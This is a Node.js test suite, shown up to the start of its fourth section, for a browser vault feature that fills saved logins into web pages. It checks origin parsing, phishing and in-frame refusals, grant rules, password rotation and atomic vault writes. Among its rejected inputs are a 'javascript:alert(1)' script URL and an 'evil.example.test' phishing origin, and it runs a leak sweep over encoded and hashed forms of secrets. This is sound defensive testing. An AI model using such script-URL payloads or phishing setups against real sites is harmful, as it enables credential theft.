#!/usr/bin/env node
// WEB LOGINS — r22 PIVOT («agent locates, hub fills»):
//   vibespace-browser fill <@ref|selector> --vault [new:]<entry>/<field> [--generate] [--user <name>]
//
// FAST tier (< 3 s): pure 3-slot human-only rules + vault-engine batch/tmp pins + fake-kernel primitive leg
// (real vault-engine + real browser-logins + real browser-dialogs + real routes/browser + real routes/vault +
// shipped vibespace-browser CLI) + zero-secret/zero-digest sweep + 3 named RED mutants + PIN G safe guards.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import crypto from 'node:crypto';
import { spawn } from 'node:child_process';
import { createRequire } from 'node:module';
import { scratch, freePort, deadPort, anchored } from './scratch.mjs';
import { mutantCopies, copiesCensus } from './mutant-copy.mjs';
import { startFakeKernel } from './fixtures/fake-kernel.mjs';
import { runR28LoginNails } from './fixtures/r28-login-nails.mjs';
import { runR29LoginNails } from './fixtures/r29-login-nails.mjs';
import { runR30LoginNails } from './fixtures/r30-login-nails.mjs';
import { markTimedOut } from './lib/timed-out.mjs';

// B-21cc (the coordinator's r2491): a vault fill acts on the session's CURRENT tab, which the keeper reads from the session's own
// `tab list` (the row marked active). These worlds have no driver session, so each watch made here gets a keeper whose
// `currentTabOf` answers the tab that watch's scene made current (`noteActiveTab`, on the watch or through the route), and refuses
// by name when none was made current — never a guess. Every other keeper member is the world's own.
function withCurrentTab(DmMod) {
  return { ...DmMod, create(opts = {}) {
    const cur = new Map();
    const k0 = opts.keeper || null;
    const keeper = k0 ? Object.assign({}, k0, { currentTabOf: async ({ profileId = '', browserKey = '' } = {}) => { const id = cur.get(String(profileId || '') + '|' + String(browserKey || '')); return id ? { ok: true, targetId: id } : { ok: false, code: 'current_tab_unreadable', error: 'VibeSpace could not read which tab this conversation is on (this world made none current) — nothing was filled; try again' }; } }) : k0;
    const d = DmMod.create({ ...opts, keeper });
    const n0 = d.noteActiveTab;
    if (typeof n0 === 'function') d.noteActiveTab = (t, id) => { if (t && id) cur.set(String(t.profileId || '') + '|' + String(t.browserKey || ''), String(id)); return n0(t, id); };
    return d;
  } };
}

const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
const express = require(path.join(REPO, 'node_modules/express'));
const BL = require(path.join(REPO, 'src/browser-login.js'));
const BM = require(path.join(REPO, 'src/browser-mediation.js'));
const BV = require(path.join(REPO, 'src/browser-verbs.js'));
const VE = require(path.join(REPO, 'src/server/vault-engine.js'));
const GS = require(path.join(REPO, 'src/server/grants-store.js'));
const BK = require(path.join(REPO, 'src/server/browser-keeper.js'));
const Lm = require(path.join(REPO, 'src/server/browser-logins.js'));
const Dm = require(path.join(REPO, 'src/server/browser-dialogs.js'));
const LF = (() => { try { return require(path.join(REPO, 'src/server/browser-login-fill.js')); } catch { return null; } })();
// THE FLAKE CENSUS, ROUND 2 (主开发 r4456, lane bl-loop-b): a mutant's red that waited a CLOCK for its own CDP effect waits for the
// effect itself (at the kernel, at the watch) under a generous bound; a bound that runs out is SAID by the tree's one mark
// (scripts/lib/timed-out.mjs) on its own line right above the judge, which reads as before. heldSends(): the tree's own socket with
// the named methods HELD off the wire until release() — the late thing, held at will
const WSClient = require(path.join(REPO, 'node_modules/ws')).WebSocket;
const untilFact = async (read, what, ms = 15000) => { const t0 = Date.now(); for (;;) { const v = await read(); if (v) return v; if (Date.now() - t0 > ms) return markTimedOut(v, ms, what); await new Promise((r) => setTimeout(r, 5)); } };   // (a read may be async: it is awaited)
// a Fetch mode call that takes a tab OFF the credential patterns (a Fetch.disable, or an enable of Document requests only): the
// relaxed mode of mutant 10 and the fence lift's own sync of mutant 14 — no mode a fill puts on (all requests) is one (主开发 r4600's should)
const fetchOffCred = (c) => !!c && (c.method === 'Fetch.disable' || (c.method === 'Fetch.enable' && Array.isArray(c.params && c.params.patterns) && c.params.patterns.length > 0 && c.params.patterns.every((pt) => pt && pt.resourceType === 'Document')));
function heldSends(methods) {
  const held = []; let holding = false;
  class HeldWS extends WSClient {
    send(d, ...a) { let j = null; try { j = JSON.parse(String(d)); } catch { /* not a call */ } const m = j && j.method; if (holding && methods.includes(m)) { held.push({ method: m, params: j.params || {}, go: () => super.send(d, ...a) }); return undefined; } return super.send(d, ...a); }
  }
  return { Impl: HeldWS, held, hold() { holding = true; }, release() { holding = false; for (const h of held.splice(0)) h.go(); } };
}
const Rm = require(path.join(REPO, 'src/routes/browser.js'));
const VRm = require(path.join(REPO, 'src/routes/vault.js'));

let pass = 0, fail = 0;
const ok = (c, label, detail) => {
  if (c) { pass++; console.log('  ✓ ' + label); }
  else { fail++; console.error('  ✗ ' + label + (detail !== undefined ? '\n      ' + (typeof detail === 'string' ? detail : JSON.stringify(detail)) : '')); }
  return !!c;
};
// B-0d3e: a red control's product edit, its anchor judged BY NAME — any count but one (for 'all' / 'join' / 'first' or a /g
// anchor: none) is a red row of this suite's own check naming the anchor and the file; the copy is then built as before (nothing
// crashes). 'first' = an anchor the product holds more than once today: the first one is patched, as it always was
function editAnchor(text, from, to, file, mode = 'one') {
  const t = String(text), re = from instanceof RegExp, many = mode !== 'one' || (re && from.global);
  const n = re ? [...t.matchAll(new RegExp(from.source, from.flags.replace(/[gy]/g, '') + 'g'))].length : t.split(String(from)).length - 1;
  if (many ? n === 0 : n !== 1) { const shown = re ? String(from) : JSON.stringify(String(from)).slice(0, 100); ok(false, `ANCHOR (${file}): ${shown} — found ${n} times, ${many ? 'at least one' : 'one'} meant: the copy is not the control it says`); }
  return mode === 'join' ? t.split(from).join(to) : mode === 'all' ? t.replaceAll(from, to) : t.replace(from, to);
}
const eq = (a, b, label) => ok(JSON.stringify(a) === JSON.stringify(b), label, { got: a, want: b });
const quiet = { log() {}, warn() {}, error() {} };
const stubLoginChannel = ({ mediated = false, proxy = true, ephemeral = false, remote = false, external = false, remoteSession = false, hasCdp = true, label = 'ShopProfile', action = 'fill' } = {}) =>
  BM.loginFillChannelVerdict(
    BM.leaseRoadVerdict({ mediated, proxy, ephemeral: Boolean(ephemeral), external: Boolean(external), remoteSession: Boolean(remoteSession), paired: Boolean(remote) && !external, agent: true }),
    { proxy, external, remote, remoteSession: Boolean(remoteSession), hasCdp, usableProfiles: proxy ? [label] : [], profileLabel: label, action },
  );

function spawnNailChild(scriptRel) {
  const cleanChildEnv = Object.fromEntries(
    Object.entries(process.env).filter(([k]) => !k.startsWith('VIBESPACE_') && !k.startsWith('AGENT_BROWSER_')),
  );
  cleanChildEnv.VIBESPACE_SKIP_AGENT_HOOKS = '1';
  cleanChildEnv.VS_NO_REAL_CLI = '1';
  return new Promise((resolve) => {
    const ch = spawn(process.execPath, [path.join(REPO, scriptRel), `--repo=${REPO}`], {
      cwd: REPO,
      env: cleanChildEnv,
    });
    let out = '';
    ch.stdout.on('data', (d) => { out += d; });
    ch.stderr.on('data', (d) => { out += d; });
    const tm = setTimeout(() => { try { ch.kill('SIGKILL'); } catch {} }, 30_000);
    ch.on('close', (status) => {
      clearTimeout(tm);
      resolve({ scriptRel, status, out });
    });
  });
}

function replayNailChild(res, fallbackFn) {
  void fallbackFn;
  let seen = 0;
  for (const line of String(res.out || '').split('\n')) {
    if (line.startsWith('⑨ ') || line.startsWith('⑩ ')) {
      console.log(line);
      continue;
    }
    if (line.startsWith('[PASS] ')) {
      seen++;
      ok(true, line.slice('[PASS] '.length));
    } else if (line.startsWith('[FAIL] ')) {
      seen++;
      const rest = line.slice('[FAIL] '.length);
      const arrow = rest.indexOf(' -> ');
      if (arrow >= 0) ok(false, rest.slice(0, arrow), rest.slice(arrow + 4));
      else ok(false, rest);
    }
  }
  if (seen === 0 || (res.status !== 0 && fail === 0)) {
    ok(false, `${res.scriptRel} exited cleanly with checks`, { status: res.status, seen, tail: String(res.out || '').slice(-1500) });
  }
}

// Overlap independent Round 29 & Round 30 nail legs in isolated child processes (no shared LF target map).
const r29ChildPromise = spawnNailChild('scripts/fixtures/r29-login-nails.mjs');
const r30ChildPromise = spawnNailChild('scripts/fixtures/r30-login-nails.mjs');

const secretNeedles = (v) => {
  if (!v) return [];
  const b = Buffer.isBuffer(v) ? v : Buffer.from(String(v), 'utf8');
  const raw = b.toString('utf8');
  const d256 = crypto.createHash('sha256').update(b).digest();
  const d1 = crypto.createHash('sha1').update(b).digest();
  const d512 = crypto.createHash('sha512').update(b).digest();
  return [
    raw, JSON.stringify(raw).slice(1, -1), encodeURIComponent(raw),
    b.toString('hex'), b.toString('base64'), b.toString('base64url'),
    d256.toString('hex'), d256.toString('hex').toUpperCase(), d256.toString('base64'), d256.toString('base64url'),
    d1.toString('hex'), d1.toString('hex').toUpperCase(), d1.toString('base64'), d1.toString('base64url'),
    d512.toString('hex'), d512.toString('hex').toUpperCase(), d512.toString('base64'), d512.toString('base64url'),
  ].filter((x) => x && x.length >= 6);
};

const walkFiles = (dir) => {
  if (!fs.existsSync(dir)) return [];
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => {
    const p = path.join(dir, e.name);
    return e.isDirectory() ? walkFiles(p) : e.isFile() ? [p] : [];
  });
};

// ═══ ① PURE SPEC PARSER, ORIGINS & FILL VERDICT ═══════════════════════════════════════════════════════════════════
console.log('① PURE src/browser-login.js: names, origins, --vault <entry>/<field> parser & fillVerdict');
{
  ok(BL.entryName('https://Shop.Example.test:443/login', 'Alice') === 'web-login:https://shop.example.test#alice', 'entryName normalizes origin + lowercases user');
  eq(BL.parseName('web-login:https://shop.example.test:8443#alice'), { origin: 'https://shop.example.test:8443', user: 'alice' }, 'parseName keeps non-default port');
  const dynPortA = await deadPort();
  const dynPortB = await deadPort();
  ok(BL.secureOrigin('https://shop.example.test') && BL.secureOrigin(`http://127.0.0.1:${dynPortA}`) && BL.secureOrigin(`http://localhost:${dynPortB}`) && !BL.secureOrigin('http://shop.example.test'), 'secureOrigin admits https and localhost http only');

  const hasSpecParser = ok(typeof BL.parseVaultFillSpec === 'function' && Array.isArray(BL.VAULT_FIELDS), 'r22 exports parseVaultFillSpec + VAULT_FIELDS');
  if (hasSpecParser) {
    eq(BL.VAULT_FIELDS, ['user', 'password', 'previous', 'pending', 'otp'], 'VAULT_FIELDS = [user, password, previous, pending, otp]');
    const s1 = BL.parseVaultFillSpec('shop.example.test#alice/password');
    ok(s1.ok && !s1.isNew && s1.origin === 'https://shop.example.test' && s1.user === 'alice' && s1.field === 'password', 'parseVaultFillSpec parses <site>#<user>/password', s1);
    const s2 = BL.parseVaultFillSpec('new:shop.example.test#bob/password', { generate: true });
    ok(s2.ok && s2.isNew && s2.origin === 'https://shop.example.test' && s2.user === 'bob' && s2.generate === true, 'parseVaultFillSpec parses new:<site>#<user>/password --generate', s2);
    const s3 = BL.parseVaultFillSpec('new:shop.example.test/password', { generate: true, user: 'carol' });
    ok(s3.ok && s3.isNew && s3.user === 'carol', 'parseVaultFillSpec accepts --user <name> with new:<site>/password --generate', s3);
    const badField = BL.parseVaultFillSpec('shop.example.test/secret');
    ok(!badField.ok && badField.code === 'bad_request', 'unknown field refused bad_request', badField);
    const newNoGen = BL.parseVaultFillSpec('new:shop.example.test#bob/password', { generate: false });
    ok(!newNoGen.ok && /vibespace-vault request/.test(newNoGen.error), 'new: without --generate refuses and points to vibespace-vault request', newNoGen);
    const genUser = BL.parseVaultFillSpec('shop.example.test#alice/user', { generate: true });
    ok(!genUser.ok && genUser.code === 'bad_request', '--generate on /user refused bad_request', genUser);

    // m4: bare `localhost:<port>`, `app.localhost:<port>`, and `host:<port>` shorthands resolve cleanly (never misread as URL scheme)
    const lhTab = `http://localhost:${dynPortB}`;
    const lh1 = BL.parseVaultFillSpec(`localhost:${dynPortB}#bob/password`, { tabOrigin: lhTab });
    const lh2 = BL.parseVaultFillSpec(`new:localhost:${dynPortB}#bob/password`, { generate: true, tabOrigin: lhTab });
    const lh3 = BL.parseVaultFillSpec(`localhost:${dynPortB}#bob/password`, { tabOrigin: '' });
    const lhSub = BL.parseVaultFillSpec(`app.localhost:${dynPortB}#bob/password`, { tabOrigin: `http://app.localhost:${dynPortB}` });
    const hpHttps = BL.parseVaultFillSpec('shop.example.test:8443#bob/password', { tabOrigin: 'https://shop.example.test:8443' });
    const jsBad = BL.parseVaultFillSpec('javascript:alert(1)#bob/password', { tabOrigin: lhTab });
    const mailBad = BL.parseVaultFillSpec('mailto:bob@example.com#bob/password', { tabOrigin: lhTab });
    const ftpBad = BL.parseVaultFillSpec('ftp://files.example.test#bob/password', { tabOrigin: lhTab });
    const ftpOrigin = BL.originOf('ftp://files.example.test/pub');
    ok(lh1.ok && lh1.origin === lhTab
      && lh2.ok && lh2.isNew && lh2.origin === lhTab
      && lh3.ok && lh3.origin === `https://localhost:${dynPortB}`
      && lhSub.ok && lhSub.origin === `http://app.localhost:${dynPortB}`
      && hpHttps.ok && hpHttps.origin === 'https://shop.example.test:8443'
      && !jsBad.ok && jsBad.code === 'login_bad_origin'
      && !mailBad.ok && mailBad.code === 'login_bad_origin'
      && !ftpBad.ok && ftpBad.code === 'login_bad_origin' && ftpOrigin === null,
      'm4: bare localhost:<port>, app.localhost:<port>, and host:<port> shorthands parse cleanly while ftp://, javascript:, and mailto: reject login_bad_origin',
      { lh1, lh2, lh3, lhSub, hpHttps, jsBad, mailBad, ftpBad, ftpOrigin });

    const entries = [
      { name: 'web-login:https://shop.example.test#alice', origin: 'https://shop.example.test', user: 'alice', owner: null },
      { name: 'web-login:https://shop.example.test#bob', origin: 'https://shop.example.test', user: 'bob', owner: null },
      { name: 'web-login:https://shop.example.test#own1', origin: 'https://shop.example.test', user: 'own1', owner: 'conv-own' },
    ];
    const allowAlice = (r) => (r === 'https://shop.example.test#alice' ? [{ door: 'browser-login', resource: r, to: [{ kind: 'conversation', key: 'conv-1' }], except: [] }] : []);
    const allowAliceAndBob = (r) => ((r === 'https://shop.example.test#alice' || r === 'https://shop.example.test#bob')
      ? [{ door: 'browser-login', resource: r, to: [{ kind: 'conversation', key: 'conv-1' }], except: [] }]
      : []);
    const allowSite = (r) => (r === 'https://shop.example.test#*' ? [{ door: 'browser-login', resource: r, to: [{ kind: 'conversation', key: 'conv-1' }], except: [] }] : []);
    const siteSpec = BL.parseVaultFillSpec('shop.example.test/password');
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', inFrame: true, spec: s1, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_in_frame', 'fillVerdict: inFrame => login_in_frame');
    ok(BL.fillVerdict({ tabOrigin: 'https://evil.example.test', spec: s1, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_phishing', 'fillVerdict: mismatched tabOrigin => login_phishing');
    ok(BL.fillVerdict({ tabOrigin: 'https://evil.example.test', inFrame: true, spec: s1, entries: [], grantRows: () => [], facts: {}, vaultState: 'locked' }).code === 'vault_locked',
      'M1 gate order: fillVerdict checks vault_locked BEFORE entry, grant, tabOrigin, and inFrame');
    ok(BL.fillVerdict({ tabOrigin: 'https://evil.example.test', inFrame: true, spec: BL.parseVaultFillSpec('shop.example.test#nobody/password'), entries, grantRows: allowSite, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_no_entry',
      'M1 gate order: fillVerdict checks entry & grant BEFORE tabOrigin and inFrame');
    const singleAdmitted = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: siteSpec, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    const ambPartial = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: siteSpec, entries, grantRows: allowAliceAndBob, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    const ambUngranted = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: siteSpec, entries, grantRows: () => [], facts: { conversationKeys: ['conv-stranger'] }, vaultState: 'unlocked' });
    const probeRealUser = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#bob/password'), entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    const probeGhostUser = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#nobody/password'), entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    ok(singleAdmitted.ok && singleAdmitted.user === 'alice'
      && ambPartial.code === 'login_ambiguous' && ambPartial.error.includes('2 logins match') && ambPartial.error.includes('alice, bob') && !ambPartial.error.includes('own1'),
      'fillVerdict (m7 + r25 grant-first): single granted account resolves cleanly without leaking ungranted accounts; multiple granted accounts list ONLY admitted accounts & count (never own1)',
      { singleAdmitted, ambPartial });
    ok(ambUngranted.code === 'login_not_granted' && ambUngranted.name === undefined
      && !ambUngranted.error.includes('alice') && !ambUngranted.error.includes('bob') && !ambUngranted.error.includes('own1') && !/\b[23]\b/.test(ambUngranted.error)
      && /Use for…/.test(ambUngranted.error)
      && probeRealUser.code === 'login_not_granted' && probeGhostUser.code === 'login_not_granted'
      && probeRealUser.error === probeGhostUser.error && probeRealUser.name === undefined && probeGhostUser.name === undefined,
      'fillVerdict (r25 grant-first): ungranted caller gets login_not_granted naming ONLY origin (0 usernames, 0 counts, no name, no #user enumeration oracle)',
      { ambUngranted, probeRealUser, probeGhostUser });
    const noEntry = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#nobody/password'), entries, grantRows: allowSite, facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' });
    ok(noEntry.code === 'login_no_entry' && /vibespace-vault request/.test(noEntry.error), 'fillVerdict: missing entry => login_no_entry naming vibespace-vault request', noEntry);
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: s1, entries, grantRows: () => [], facts: { conversationKeys: ['conv-1'] }, vaultState: 'unlocked' }).code === 'login_not_granted', 'fillVerdict: ungranted => login_not_granted');
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: BL.parseVaultFillSpec('shop.example.test#own1/password'), entries, grantRows: () => [], facts: { conversationKeys: ['conv-other'] }, owners: ['conv-own'], vaultState: 'unlocked' }).ok, 'fillVerdict: caller-owned entry needs no grant');
    ok(BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: s1, entries, grantRows: allowAlice, facts: { conversationKeys: ['conv-1'] }, vaultState: 'locked' }).code === 'vault_locked', 'fillVerdict: locked vault => vault_locked');
  }
}

// ═══ ② PURE 3-SLOT HUMAN-ONLY LIFECYCLE (RULING 1) & DEFAULT-ONLY GENERATOR (RULING 5) ═══════════════════════════
console.log('② PURE 3-slot human-only lifecycle («只有人能转正», zero clock promotion/deletion, 7d single reminder) + 24-char generator');
{
  const has3Slot = ok(
    typeof BL.newRecord === 'function'
      && typeof BL.mintChangeRecord === 'function'
      && typeof BL.confirmPendingRecord === 'function'
      && typeof BL.discardPendingRecord === 'function'
      && typeof BL.shouldRemindPending === 'function'
      && typeof BL.pendingRemindKey === 'function'
      && Array.isArray(BL.PENDING_KINDS),
    'r22 exports 3-slot human-only record functions + 7-day reminder helpers',
  );
  if (has3Slot) {
    const T0 = 1_700_000_000_000;
    const DAY = 86_400_000;
    let i = 0;
    const g = BL.generatePassword(() => Buffer.from([(i = (i + 37) & 0xff)]));
    ok(g.ok && g.password.length === 24 && BL.GENERATED_LEN === 24 && BL.CLASSES.every((cls) => [...g.password].some((ch) => cls.includes(ch))),
      'generatePassword: default-only 24-char password with all 4 character classes', g);

    const reg = BL.newRecord({
      origin: 'https://shop.example.test', username: 'bob', password: g.password,
      source: 'vault-minted', pending: 'register',
      conversation: 'Chat', now: T0, rev: 1, entryGen: 'lg-abcdef012345',
    });
    ok(reg && reg.current === null && reg.previous === null && reg.pending && reg.pending.kind === 'register' && reg.pending.password === g.password,
      'newRecord(pending:"register"): current=null, previous=null, pending={kind:"register"}');

    // Clock invariance: even 365 days later, re-reading NEVER promotes pending -> current!
    const reg365 = BL.recordOf(BL.textOf(reg));
    ok(reg365?.current === null && reg365?.pending?.kind === 'register' && !BL.shouldRemindPending(reg, T0 + 6 * DAY) && BL.shouldRemindPending(reg, T0 + 7 * DAY),
      'RULING 1: pending never auto-promotes with time; shouldRemindPending is false at +6d and true at +7d');
    const remKey = BL.pendingRemindKey('web-login:https://shop.example.test#bob', reg);
    ok(typeof remKey === 'string' && remKey.includes('web-login:https://shop.example.test#bob\u00001\u0000register\u0000')
      && !BL.shouldRemindPending(reg, T0 + 8 * DAY, { alreadyReminded: true })
      && !BL.shouldRemindPending(reg, T0 + 365 * DAY, { alreadyReminded: true })
      && JSON.stringify(BL.recordOf(reg)) === JSON.stringify(reg),
      'RULING 1 + r27: pendingRemindKey tracks external one-shot reminder without mutating the login record (+8d, +365d stay false)');

    // Discard on unconfirmed register drops the entry
    const discReg = BL.discardPendingRecord(reg);
    ok(discReg?.ok && discReg.dropEntry === true && discReg.record === null, 'RULING 1: discardPendingRecord on unconfirmed register => dropEntry:true');

    // Human Confirm promotes pending -> current (rev++)
    const conf1Res = BL.confirmPendingRecord(reg, { now: T0 + 1000 });
    const conf1 = conf1Res?.record || null;
    ok(Boolean(conf1Res?.ok && conf1?.rev === 2 && conf1?.current?.password === g.password && conf1?.pending === null && conf1?.previous === null),
      'RULING 1: confirmPendingRecord promotes register pending -> current, rev=2');

    // Candidate change -> Discard keeps current intact; second change -> Confirm rotates old current -> previous
    const cand1 = 'CandOne!2345678901234567';
    const chg1Res = conf1 ? BL.mintChangeRecord(conf1, cand1, { now: T0 + 2000 }) : null;
    const chg1 = chg1Res?.record || null;
    ok(Boolean(chg1Res?.ok && chg1?.rev === 3 && chg1?.current?.password === g.password && chg1?.pending?.kind === 'change' && chg1?.pending?.password === cand1),
      'mintChangeRecord keeps current and stages pending:"change"');
    const dupChg = chg1 ? BL.mintChangeRecord(chg1, 'Another!2345678901234567', { now: T0 + 2500 }) : null;
    ok(Boolean(dupChg && !dupChg.ok && dupChg.code === 'login_pending_exists'), 'mintChangeRecord refuses second pending candidate [login_pending_exists]');
    const discChg = chg1 ? BL.discardPendingRecord(chg1) : null;
    ok(Boolean(discChg?.ok && discChg.dropEntry === false && discChg.record?.rev === 4 && discChg.record?.current?.password === g.password && discChg.record?.pending === null),
      'RULING 1: discardPendingRecord on change clears pending and keeps current intact');

    const cand2 = 'CandTwo!2345678901234567';
    const chg2 = discChg?.record ? BL.mintChangeRecord(discChg.record, cand2, { now: T0 + 3000 })?.record : null;
    const conf2 = chg2 ? BL.confirmPendingRecord(chg2, { now: T0 + 4000 })?.record : null;
    ok(Boolean(conf2?.rev === 6 && conf2?.current?.password === cand2 && conf2?.previous?.password === g.password && conf2?.pending === null),
      'RULING 1: confirmPendingRecord on change promotes pending -> current and rotates old current -> previous');

    // Third rotation replaces previous (earlier previous dropped); previous is never deleted by clock even at +365d
    const cand3 = 'CandThr!2345678901234567';
    const chg3 = conf2 ? BL.mintChangeRecord(conf2, cand3, { now: T0 + 5000 })?.record : null;
    const conf3 = chg3 ? BL.confirmPendingRecord(chg3, { now: T0 + 365 * DAY })?.record : null;
    const conf3Reread = conf3 ? BL.recordOf(BL.textOf(conf3)) : null;
    ok(Boolean(conf3?.current?.password === cand3 && conf3?.previous?.password === cand2 && conf3Reread?.previous?.password === cand2),
      'RULING 1: previous is never deleted by clock and is replaced only on the next Confirm rotation');

    const pub = conf3 ? BL.publicOf(conf3, { name: 'web-login:https://shop.example.test#bob' }) : null;
    const pubJson = JSON.stringify(pub);
    ok(Boolean(pub && pub.rev === conf3.rev && pub.hasCurrent === true && pub.hasPrevious === true && pub.pending === null && ![g.password, cand1, cand2, cand3].some((s) => pubJson.includes(s))),
      'publicOf exposes rev + slot booleans only and zero passwords');

    // Legacy .378 5-shape upgrade compatibility (no rev, no entryGen, legacy `password` / `previous` / `pending` strings)
    const leg1 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l1', password: 'LegacyPw1!abcdefgh', source: 'owner', createdAt: T0, updatedAt: T0 }));
    const leg2 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l2', password: 'LegacyCur2!abcdefg', previous: { password: 'LegacyOld2!abcdefg', replacedAt: T0 - 1000 }, source: 'owner', createdAt: T0 - 2000, updatedAt: T0 }));
    const leg3 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l3', password: 'LegacyCand3!abcdef', previous: { password: 'LegacyCur3!abcdefg', replacedAt: T0 }, pending: 'change', source: 'vault-minted', createdAt: T0 - 5000, updatedAt: T0 }));
    const leg4 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l4', password: 'LegacyReg4!abcdefg', pending: 'register', source: 'vault-minted', createdAt: T0, updatedAt: T0 }));
    const leg5 = BL.recordOf(JSON.stringify({ v: 1, origin: 'https://shop.example.test', username: 'l5', password: 'LegacyAgent5!abcde', totpName: 'totp-l5', source: 'agent-typed', createdAt: T0, updatedAt: T0 }));
    ok(Boolean(
      [leg1, leg2, leg3, leg4, leg5].every((l) => l?.schema === 2 && JSON.stringify(BL.recordOf(l)) === JSON.stringify(l))
      && leg1?.current?.password === 'LegacyPw1!abcdefgh' && leg1.pending === null && leg1.rev === 1
      && leg2?.current?.password === 'LegacyCur2!abcdefg' && leg2?.previous?.password === 'LegacyOld2!abcdefg'
      && leg3?.current?.password === 'LegacyCand3!abcdef' && leg3?.previous?.password === 'LegacyCur3!abcdefg' && leg3?.pending === null
      && leg4?.current === null && leg4?.pending?.kind === 'register' && leg4?.pending?.password === 'LegacyReg4!abcdefg'
      && leg5?.current?.password === 'LegacyAgent5!abcde' && leg5.totpName === 'totp-l5'
    ), 'legacy .356-.390 5 record shapes upgrade losslessly to canonical schema:2, recordOf(recordOf(x))===recordOf(x), and .390 pending:change fills candidate');
  }
}

// ═══ ③ VAULT-ENGINE BATCH WRITE (afterCommit + PIN F on tmpfs & ext4) & STALE TMP SWEEP ════════════════════════════
console.log('③ vault-engine: batchRecordWrite (afterCommit + PIN F renameCount/tmpOpenCount on tmpfs & ext4) & sweepStaleVaultTmp');
{
  const runPinFLeg = async (rootDir, fsLabel) => {
    fs.rmSync(rootDir, { recursive: true, force: true });
    fs.mkdirSync(rootDir, { recursive: true });
    try {
      const staleTmp = path.join(rootDir, 'vault.json.tmp-999999999-deadbeef');
      fs.writeFileSync(staleTmp, '{"partial":true}', { mode: 0o600 });
      const eng = VE.create({ dataDir: rootDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
      if (fsLabel === 'tmpfs') ok(!fs.existsSync(staleTmp), 'sweepStaleVaultTmp removes orphan vault.json.tmp-<deadPid>-* on boot');
      await eng.setup('VaultPass!r22#Batch');

      const hasBatch = fsLabel === 'tmpfs'
        ? ok(typeof eng.batchRecordWrite === 'function' && typeof eng.loginRevFloor === 'function', 'vault-engine exports batchRecordWrite + loginRevFloor')
        : (typeof eng.batchRecordWrite === 'function' && typeof eng.loginRevFloor === 'function');
      if (hasBatch) {
        let renameCount = 0, tmpOpenCount = 0;
        const origRename = fs.renameSync, origOpen = fs.openSync;
        fs.renameSync = function (...args) {
          if (String(args[1] || '').endsWith('vault.json')) renameCount++;
          return origRename.apply(this, args);
        };
        fs.openSync = function (...args) {
          if (String(args[0] || '').includes('vault.json.tmp-') && args[1] === 'wx') tmpOpenCount++;
          return origOpen.apply(this, args);
        };
        let committed = 0;
        try {
          eng.batchRecordWrite((afterCommit) => {
            eng.secretPut('web-login:https://a.example.test#u1', '{"v":1,"rev":3}', { kind: 'owner', rev: 3 });
            eng.secretPut('web-login:https://b.example.test#u2', '{"v":1,"rev":5}', { kind: 'owner', rev: 5 });
            eng.secretDrop('web-login:https://b.example.test#u2');
            afterCommit(() => { committed++; });
            if (fsLabel === 'tmpfs') ok(committed === 0, 'afterCommit does not fire before vault.json atomic rename');
          });
        } finally {
          fs.renameSync = origRename;
          fs.openSync = origOpen;
        }
        const namesRow = (eng.secretNames() || []).find((s) => s.name === 'web-login:https://a.example.test#u1');
        ok(renameCount === 1 && tmpOpenCount === 1 && committed === 1 && eng.loginRevFloor() === 5 && namesRow?.rev === 3,
          `PIN F (${fsLabel}) + L2: batchRecordWrite coalesces N writes into renameCount===1 & tmpOpenCount===1 (syscall counters only), advances loginRevFloor, exposes secretNames().rev===3, and runs afterCommit once`,
          { fsLabel, renameCount, tmpOpenCount, committed, floor: eng.loginRevFloor(), namesRev: namesRow?.rev });

        if (fsLabel === 'tmpfs') {
          let abortedCommit = 0, threw = false;
          try {
            eng.batchRecordWrite((afterCommit) => {
              eng.secretPut('web-login:https://c.example.test#u3', '{"v":1}', { kind: 'owner', rev: 2 });
              afterCommit(() => { abortedCommit++; });
              throw new Error('simulated failure');
            });
          } catch { threw = true; }
          ok(threw && abortedCommit === 0 && !eng.hasEntry('web-login:https://c.example.test#u3'),
            'batchRecordWrite rolls back in-memory record and suppresses afterCommit on throw');
        }
      }
      eng.close();
    } finally {
      fs.rmSync(rootDir, { recursive: true, force: true });
    }
  };
  await runPinFLeg(scratch('vl-r23-ve-tmpfs'), 'tmpfs');
  const ext4Base = fs.existsSync('/var/tmp') ? `/var/tmp/vs-pinf-ext4-${process.pid}-${crypto.randomBytes(4).toString('hex')}` : scratch('vl-r23-ve-ext4');
  await runPinFLeg(ext4Base, 'ext4');
}

// ═══ ④ FAKE-KERNEL PRIMITIVE LEG (CLI + ROUTES + WATCH + VAULT + READ FENCE + WIPE + SWEEP) ═══════════════════════
console.log('④ Fake-kernel primitive leg: fill @ref/selector --vault, human-only Confirm/Discard, 409 fence, SPA wipe, exfil block, zero-digest sweep');
{
